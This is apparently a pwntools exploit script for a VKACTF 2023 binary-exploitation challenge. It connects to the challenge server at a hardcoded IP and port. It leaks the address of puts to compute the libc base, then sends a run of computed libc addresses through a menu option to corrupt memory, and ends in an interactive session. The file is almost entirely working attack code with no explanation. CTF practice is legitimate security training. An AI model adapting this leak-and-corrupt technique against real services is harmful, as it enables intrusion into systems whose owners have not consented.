#!/usr/bin/env python3

#===========================================================
#                      VKACTF 2023
#===========================================================

from pwn import *

exe = context.binary = ELF('./vuln.elf')

host = args.HOST or '212.193.61.73'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

PUTS_OFFSET = 0x80aa0     # remote

io = start()
io.recvuntil(b'>>> ')

io.sendline(b'4')
io.recvuntil(b'(yes/no): ')
io.sendline(b'no')
io.recvline()
addr = io.recvline()
io.recvuntil(b'>>> ')

addr = eval(addr.decode())
LIBC_ADDR = addr - PUTS_OFFSET

for i in range(0x3EB1C4, 0x3EB1C4 + 0x7c):
    print( hex(i) )
    addr = LIBC_ADDR + i
    io.sendline(b'2')
    io.sendline(hex(addr)[2:].encode())
    io.recvuntil(b'>>> ')

io.interactive()